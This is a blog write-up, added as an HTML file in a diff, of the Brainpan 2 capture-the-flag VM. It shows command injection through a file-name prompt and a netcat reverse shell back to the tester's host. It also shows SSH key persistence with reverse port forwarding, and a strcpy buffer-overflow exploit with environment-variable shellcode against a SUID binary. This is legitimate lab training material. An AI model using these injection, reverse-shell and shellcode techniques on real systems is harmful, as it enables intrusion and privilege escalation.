@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Brainpan: 2 - Part 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-06-01">June 01, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/brainpan">brainpan</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Brainpan: 2 - Part 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Following the popularity of Brainpan 1, Brainpan 2 was released as a competition on VulnHub.  I didn&rsquo;t take part, but since the VM remains on VulnHub, I had a go at it retrospectively.  The goal is to gain root access and obtain /root/flag.txt.</p>
+
+<h2 id="nmap:fd0e7d44f60d37a03464dc18f2eb9f37">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -p- -A 192.168.127.131
+  
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+1 service unrecognized despite returning data.
+</code></pre>
+
+<p>This output looked identical to Brainpan 1 - the same looking application on 9999 and a web server on 10000.  I connected to port 9999 with <code>netcat</code>.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-2/brainpan2.png"  />
+    
+    
+</figure>
+</div>
+
+<p>So a little bit different to the original, since this is now asking for a login rather than a password.  I found a funny little easter egg by trying <code>shitstorm</code>.</p>
+
+<pre><code class="language-text">&gt;&gt; shitstorm
+Never gonna give you up Never gonna let you down Never gonna run around and desert you
+</code></pre>
+
+<p>So without thining about it too much,  I guessed I would have to exploit this application in the same way as Brainpan 1.  I just popped <code>192.168.127.131:10000/bin/</code> into my web browser and downloaded the <code>brainpan.exe</code> file which was in there.  I then tried running it in <code>wine</code>.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# wine brainpan.exe 
+wine: Bad EXE format for Z:\root\brainpan\2\brainpan.exe.
+</code></pre>
+
+<p>A bit unexpected&hellip;</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# file brainpan.exe
+brainpan.exe: JPEG image data, JFIF standard 1.01, comment: &quot;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85&quot;
+</code></pre>
+
+<p>So it&rsquo;s actually a JPEG.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-2/mario.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>Gah, trolled&hellip;</p>
+
+<p>I ran <code>nikto</code> and <code>wfuzz</code> against the web service, but nothing popped except the <code>/bin/</code> directory, so I turned my attention back to the app on 9999.</p>
+
+<h2 id="command-injection:fd0e7d44f60d37a03464dc18f2eb9f37">Command Injection</h2>
+
+<pre><code class="language-text">&gt;&gt; GUEST
+                          ACCESS GRANTED
+  
+                             *  *  *  *                                
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
+    TYPE &quot;TELL ME MORE&quot; FOR A LIST OF COMMANDS.  
+                             *  *  *  *
+</code></pre>
+
+<p>I spent some time playing around with the commands.  The <code>HELP</code> commands prints a man page for the application, which reveals a <code>DEBUG</code> account also exists.  This enables some extra commands in the application, but nothing more which helped me at this point.</p>
+
+<pre><code class="language-text">&gt;&gt; FILES
+total 36
+-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe
+-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt
+-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt
+-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 test-1
+-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 test-2
+  
+&gt;&gt; VIEW
+    ENTER FILE TO DOWNLOAD: notes.txt
+</code></pre>
+
+<p>There is quite a lot of information here, which come in useful at different parts of the challenge.  The most pertinent at this point are the following lines:</p>
+
+<pre><code class="language-text">puck:
+Easiest way to display file contents is to just use popen(). Eg:
+popen(&quot;/bin/ls&quot;, &quot;r&quot;);
+popen(&quot;/bin/man ./brainpan.7&quot;, &quot;r&quot;);
+popen(&quot;/usr/bin/top&quot;, &quot;r&quot;);
+etc...
+</code></pre>
+
+<p>If this is how the application is working, then these commands are vulnerable to command injection.  The <code>VIEW</code> command takes user input for the filename to display, so I assumed the backend code would look something like:</p>
+
+<p><code>popen(&quot;cat &quot;, + filename);</code></p>
+
+<p>With no sanitiztion, it would allow me to chain new commands as part of the filename input.  I did a quick test, using a <code>;</code> and the <code>id</code> command.</p>
+
+<pre><code class="language-text">&gt;&gt; VIEW
+    ENTER FILE TO DOWNLOAD: ; id
+uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
+</code></pre>
+
+<p>Cool.  I was then able to take this further to gain a <code>netcat</code> shell on the system.</p>
+
+<p><code>ENTER FILE TO DOWNLOAD: ; nc 192.168.127.127 4444 -e '/bin/sh'</code></p>
+
+<h2 id="ssh-foothold:fd0e7d44f60d37a03464dc18f2eb9f37">SSH Foothold</h2>
+
+<p>For the sake of a coherent write-up, I&rsquo;m going to include maintaining SSH access to the system.  When I originally exploited Brainpan 2, I didn&rsquo;t do this until way later on, because I was getting annoyed at losing my remote shells due to making mistakes etc and then having to re-exploit to re-gain access.</p>
+
+<pre><code class="language-text">netstat -antp
+Active Internet connections (servers and established)
+tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -
+  
+ps aux | grep sshd
+root      2181  0.0  0.2   6464  1056 ?        Ss   12:49   0:00 /usr/sbin/sshd
+  
+cat /etc/ssh/sshd_config
+ListenAddress 127.0.1.1
+Port 2222
+  
+cat /etc/hosts
+127.0.1.1   brainpan2
+</code></pre>
+
+<p>SSH has been setup up in quite an usual way - listening on an internal address on an alternate port.  I set up a reverse SSH connection back to my Kali machine.  This allows me to bind <code>127.0.1.1:2222</code> on brainpan2 to <code>127.0.0.1:2222</code> on Kali and initiate a forward SSH connection, back through the reverse connection.</p>
+
+<pre><code class="language-text">python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+cd /home/anansi/.ssh
+echo &quot;ssh-rsa AAAA[...snip...]MQGB root@kali&quot; &gt;&gt; authorized_keys
+anansi@brainpan2:/opt/brainpan$ ssh root @ 192.168.127.127 -R 2222:127.0.1.1:2222
+root @ 192.168.127.127's password:
+root@kali:~#
+</code></pre>
+
+<p>On my Kali VM:</p>
+
+<pre><code class="language-text">root@kali:~# netstat -antp
+tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      3986/3
+  
+root@kali:~# ssh anansi @ 127.0.0.1 -p 2222
+anansi@brainpan2:~$ 
+</code></pre>
+
+<h2 id="more-trolls:fd0e7d44f60d37a03464dc18f2eb9f37">More Trolls?</h2>
+
+<p>With convenient access to the system, I carried out some more enumeration.</p>
+
+<pre><code class="language-text">cat /etc/passwd
+root:x:104:106:root:/root:/bin/bash
+root :x:0:0:root:/var/root:/bin/bash
+anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash
+puck:x:1001:1001:puck,,,:/home/puck:/bin/bash
+reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash
+  
+cat /etc/group
+root:x:106:
+root :x:0:
+anansi:x:1000:
+puck:x:1001:
+reynard:x:1002:
+</code></pre>
+
+<p>Having a look through the users and groups, I noticed that there appeared to be two root users (uid 0 and 106).  It seems that the real root account has been renamed to contain a space at the end.  In addition to this, there&rsquo;s a SUID binary available that appears to be owned by root.</p>
+
+<pre><code class="language-text">find / -perm -4000 -type f 2&gt;/dev/null
+/home/reynard/msg_root
+</code></pre>
+
+<pre><code class="language-text">anansi@brainpan2:~$ ls -l /home/reynard/msg_root
+-rwsr-xr-x 1 root root 8999 Nov  6  2013 /home/reynard/msg_root
+</code></pre>
+
+<p>I&rsquo;m going to assume that exploiting this binary won&rsquo;t give me real root access.  But I couldn&rsquo;t find any other route to gain further access to the system, so I just went with it&hellip;</p>
+
+<h2 id="msg-root:fd0e7d44f60d37a03464dc18f2eb9f37">msg_root</h2>
+
+<p>I ran this binary quickly to see what it would do.  It appears to be an application to send a message to another user on the system.  It takes two inputs, a message and the destination user.</p>
+
+<pre><code class="language-text">anansi@brainpan2:/home/reynard$ ./msg_root 
+usage: msg_root username message
+</code></pre>
+
+<p>I copied the binary to my Kali machine to do some proper analysis.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# strings msg_root 
+strcpy
+strncpy
+</code></pre>
+
+<p>It seems as though one of the inputs is copied with the vulnerable strcpy function, and is likely to be vulnerable to a buffer overflow.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# ./msg_root `python -c 'print (&quot;A&quot; * 100)'` a
+Segmentation fault
+</code></pre>
+
+<p>I managed to crash it pretty quickly, so now to load it up in GDB.</p>
+
+<pre><code class="language-text">(gdb) r `python -c 'print (&quot;A&quot; * 500)'` a
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+  
+(gdb) i r
+eax            0x41414141   1094795585
+ecx            0x61 97
+edx            0xbffff6fe   -1073744130
+ebx            0xb7fbeff4   -1208225804
+esp            0xbffff2b4   0xbffff2b4
+ebp            0xbffff2d8   0xbffff2d8
+esi            0x0  0
+edi            0x0  0
+eip            0x41414141   0x41414141
+</code></pre>
+
+<p>I found that <code>EIP</code> is overwritten at just <code>14 bytes</code>.  I sent a larger buffer of A&rsquo;s, B&rsquo;s and C&rsquo;s to try and get a better understanding of what is getting overwritten on the stack.</p>
+
+<pre><code class="language-text">(gdb) r `python -c 'print (&quot;A&quot; * 14) + (&quot;B&quot; * 4) + (&quot;C&quot; * 482)'` a
+  
+(gdb) i r
+eax            0x42424242   1111638594
+ecx            0x61 97
+edx            0xbffff6fe   -1073744130
+ebx            0xb7fbeff4   -1208225804
+esp            0xbffff2b4   0xbffff2b4
+ebp            0xbffff2d8   0xbffff2d8
+esi            0x0  0
+edi            0x0  0
+eip            0x42424242   0x42424242
+  
+(gdb) x/20x $esp
+0xbffff2b4: 0x0804872e  0xbffff2c6  0x0804a008  0x00000001
+0xbffff2c4: 0x4141f394  0x41414141  0x41414141  0x0804a008
+0xbffff2d4: 0x42424242  0xbffff2e8  0x0804877b  0xbffff508
+0xbffff2e4: 0xbffff6fd  0xbffff368  0xb7e75e46  0x00000003
+0xbffff2f4: 0xbffff394  0xbffff3a4  0xb7fe0860  0xb7ff6821
+</code></pre>
+
+<p>It seems that <code>EIP</code> was pointing at <code>EAX</code> as they are both getting overwritten by my B&rsquo;s.  I can see a couple of A&rsquo;s, but my C&rsquo;s are nowhere to be found.  Even though I can control <code>EIP</code>, where am I going to jump to if I can&rsquo;t add anymore data to the stack&hellip;?</p>
+
+<p>I checked to see is ASLR was disabled on the system.</p>
+
+<pre><code class="language-text">anansi@brainpan2:/home/reynard$ cat /proc/sys/kernel/randomize_va_space 
+0
+</code></pre>
+
+<p>Sweet - so it may be possible to insert shellcode as an environmental variable, and jump to that area of memory.  I first tried it out on my Kali box (disable ASLR with <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space)</code>.</p>
+
+<p>Write the shellcode to memory, including a small <code>NOP</code> slide:</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# export egg=`python -c 'print (&quot;\x90&quot; * 50) + &quot;\xb8\x83\x64\xca\x02\xdd\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x83\xea\xfc\x31\x42\x11\x03\x42\x11\xe2\x76\x0e\xc1\x5a\xe1\x9d\xb3\x32\x3c\x41\xb5\x24\x56\xaa\xb6\xc2\xa6\xdc\x17\x71\xcf\x72\xe1\x96\x5d\x63\xf9\x58\x61\x73\xd5\x3a\x08\x1d\x06\xc8\xa2\xe1\x0f\x7d\xbb\x03\x62\x01&quot;'`
+
+
+root@kali:~/brainpan/2# ./findaddr 
+egg =&gt; 0xbffffcfb
+</code></pre>
+
+<p>Time to test it:</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# ./msg_root `python -c 'print (&quot;A&quot; * 14) + &quot;\xfb\xfc\xff\xbf&quot;'` a
+#
+</code></pre>
+
+<p>Woop - the <code>#</code> character confims a new <code>/bin/sh</code> shell has been spawned.  I repeated the process on brainpan2 and&hellip;</p>
+
+<pre><code class="language-text">anansi@brainpan2:/home/reynard$ ./msg_root `python -c 'print (&quot;A&quot; * 14) + &quot;\x97\xfe\xff\xbf&quot;'` a
+$ id; whoami
+uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
+root
+</code></pre>
+
+<p>Naturally the first instinct is to run over to the flag.</p>
+
+<pre><code class="language-text">$ ls -la /root/flag.txt
+-rw------- 1 root  root  461 Nov  5  2013 /root/flag.txt
+
+$ cat /root/flag.txt
+cat: /root/flag.txt: Permission denied
+</code></pre>
+
+<p>Gaba-whaaa&hellip;..?  There&rsquo;s another file in <code>/root</code> that can be read however.</p>
+
+<pre><code class="language-text">-rw-------  1 root  root   245 Nov  5  2013 whatif.txt
+  
+$ cat /root/whatif.txt
+  
+       WHAT IF I TOLD YOU
+              ___
+            /     \ 
+           | ______\
+          (, \_/ \_/
+           |   ._. |
+           \   --- /
+           /`-.__.'
+      .---'`-.___|\___
+     /                `.
+       YOU ARE NOT ROOT?
+
+</code></pre>
+
+<p>Haha - so we are actually root uid 106, rather than the real root.  Another good troll by superkojiman, but at least I saw this one coming ;)</p>
+
+<p>All is not lost however, as this user, I can now access another SUID binary found in <code>/opt/old/brainpan-1.8</code>.  I&rsquo;ll cover this in Part 2&hellip;</p>
+
+<h3 id="findaddr-c:fd0e7d44f60d37a03464dc18f2eb9f37">findaddr.c</h3>
+
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+   
+int main(void)
+{
+  char *s = getenv(&quot;egg&quot;);
+  printf(&quot;egg =&gt; %p\n&quot;, s);
+  return 0;
+}
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
